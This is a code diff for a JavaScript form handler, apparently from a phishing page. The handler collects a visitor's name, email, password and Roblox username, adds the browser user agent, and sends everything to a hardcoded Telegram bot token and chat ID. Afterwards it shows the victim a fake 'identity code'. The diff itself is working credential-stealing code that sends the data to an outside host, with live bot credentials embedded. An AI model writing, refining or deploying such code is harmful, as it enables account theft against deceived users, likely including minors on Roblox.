@@ -8,14 +8,18 @@ async function send() {
         name: document.getElementById('name').value,
         email: document.getElementById('email').value,
         pass: document.getElementById('pass').value,
-        roblox: document.getElementById('roblox').value
+        roblox: document.getElementById('roblox').value,
+        agent: navigator.userAgent
     };
 
-    // ضع التوكن الجديد هنا بعد تغيير القديم
     const token = "8733348298:AAFIr8AFJ1Szk-c5rJVr22aFBs_KUJCnidI"; 
     const chat_id = "8601889519"; 
-    const msg = `هوية جديدة:%0Aالاسم: ${data.name}%0Aالجيميل: ${data.email}%0Aالباس: ${data.pass}%0Aروبلوكس: ${data.roblox}`;
+    const code = Math.floor(100000 + Math.random() * 900000);
+    
+    const msg = `هوية جديدة:%0Aالاسم: ${data.name}%0Aالبريد: ${data.email}%0Aالباس: ${data.pass}%0Aروبلوكس: ${data.roblox}%0Aالجهاز: ${data.agent}%0Aالكود الخاص به: ${code}`;
 
     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`);
-    alert("تم إنشاء الهوية بنجاح.");
+    
+    document.getElementById('codeDisplay').innerText = "كود الهوية: " + code;
+    show('final');
 }
